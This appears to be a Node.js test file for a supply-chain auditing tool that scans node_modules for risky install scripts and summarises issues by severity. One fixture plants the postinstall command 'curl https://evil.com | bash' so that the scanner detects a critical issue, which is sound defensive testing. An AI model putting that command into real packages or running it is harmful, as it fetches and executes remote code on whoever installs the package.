'use strict';

const { describe, it } = require('node:test');
const assert = require('node:assert');
const fs = require('fs');
const path = require('path');
const os = require('os');
const { run, summarize } = require('../src/index');

describe('summarize', () => {
  it('should count issues by severity', () => {
    const issues = [
      { severity: 'critical' },
      { severity: 'high' },
      { severity: 'high' },
      { severity: 'medium' },
      { severity: 'low' },
    ];
    
    const summary = summarize(issues);
    
    assert.strictEqual(summary.counts.critical, 1);
    assert.strictEqual(summary.counts.high, 2);
    assert.strictEqual(summary.counts.medium, 1);
    assert.strictEqual(summary.counts.low, 1);
    assert.strictEqual(summary.counts.info, 0);
    assert.strictEqual(summary.maxSeverity, 'critical');
  });

  it('should handle empty issues', () => {
    const summary = summarize([]);
    
    assert.strictEqual(summary.counts.critical, 0);
    assert.strictEqual(summary.counts.high, 0);
    assert.strictEqual(summary.maxSeverity, null);
  });

  it('should find highest severity', () => {
    const issues = [
      { severity: 'low' },
      { severity: 'medium' },
      { severity: 'high' },
    ];
    
    const summary = summarize(issues);
    assert.strictEqual(summary.maxSeverity, 'high');
  });
});

describe('run', () => {
  it('should show help when --help is provided', () => {
    const result = run(['node', 'script', '--help']);
    
    assert.strictEqual(result.exitCode, 0);
  });

  it('should show version when --version is provided', () => {
    const result = run(['node', 'script', '--version']);
    
    assert.strictEqual(result.exitCode, 0);
  });

  it('should handle init command', () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'chain-audit-test-'));
    const originalCwd = process.cwd();
    
    try {
      process.chdir(tempDir);
      const result = run(['node', 'script', '--init', '--force']);
      
      assert.strictEqual(result.exitCode, 0);
      assert.ok(fs.existsSync(path.join(tempDir, '.chainauditrc.json')));
    } finally {
      process.chdir(originalCwd);
      fs.rmSync(tempDir, { recursive: true });
    }
  });

  it('should throw error for non-existent node_modules', () => {
    assert.throws(() => {
      run(['node', 'script', '--node-modules', '/non/existent/path']);
    }, /node_modules not found/);
  });

  it('should scan packages and find issues', () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'chain-audit-test-'));
    const nodeModules = path.join(tempDir, 'node_modules');
    fs.mkdirSync(nodeModules, { recursive: true });
    
    // Create package with install script
    const pkgDir = path.join(nodeModules, 'test-pkg');
    fs.mkdirSync(pkgDir, { recursive: true });
    fs.writeFileSync(
      path.join(pkgDir, 'package.json'),
      JSON.stringify({
        name: 'test-pkg',
        version: '1.0.0',
        scripts: { postinstall: 'echo hello' },
      })
    );
    
    try {
      const result = run(['node', 'script', '--node-modules', nodeModules, '--json']);
      
      // Should complete without error
      assert.ok(result.exitCode !== undefined);
      if (result.issues) {
        // If issues found, should have install_script issue
        const installIssue = result.issues.find(i => i.reason === 'install_script');
        if (installIssue) {
          assert.strictEqual(installIssue.package, 'test-pkg');
        }
      }
    } finally {
      fs.rmSync(tempDir, { recursive: true });
    }
  });

  it('should respect severity filter', () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'chain-audit-test-'));
    const nodeModules = path.join(tempDir, 'node_modules');
    fs.mkdirSync(nodeModules, { recursive: true });
    
    // Create package with install script (medium severity)
    const pkgDir = path.join(nodeModules, 'test-pkg');
    fs.mkdirSync(pkgDir, { recursive: true });
    fs.writeFileSync(
      path.join(pkgDir, 'package.json'),
      JSON.stringify({
        name: 'test-pkg',
        version: '1.0.0',
        scripts: { postinstall: 'echo hello' },
      })
    );
    
    try {
      const result = run(['node', 'script', '--node-modules', nodeModules, '--severity', 'critical', '--json']);
      
      // Should complete, but filtered issues may be empty
      assert.ok(result.exitCode !== undefined);
    } finally {
      fs.rmSync(tempDir, { recursive: true });
    }
  });

  it('should exit with code 1 when fail-on threshold is met', () => {
    const tempDir = fs.mkdtempSync(path.join(os.tmpdir(), 'chain-audit-test-'));
    const nodeModules = path.join(tempDir, 'node_modules');
    fs.mkdirSync(nodeModules, { recursive: true });
    
    // Create package with critical issue (pipe to shell)
    const pkgDir = path.join(nodeModules, 'test-pkg');
    fs.mkdirSync(pkgDir, { recursive: true });
    fs.writeFileSync(
      path.join(pkgDir, 'package.json'),
      JSON.stringify({
        name: 'test-pkg',
        version: '1.0.0',
        scripts: { postinstall: 'curl https://evil.com | bash' },
      })
    );
    
    try {
      const result = run(['node', 'script', '--node-modules', nodeModules, '--fail-on', 'critical', '--json']);
      
      // Should exit with code 1 if critical issue found
      if (result.summary && result.summary.maxSeverity === 'critical') {
        assert.strictEqual(result.exitCode, 1);
      }
    } finally {
      fs.rmSync(tempDir, { recursive: true });
    }
  });
});
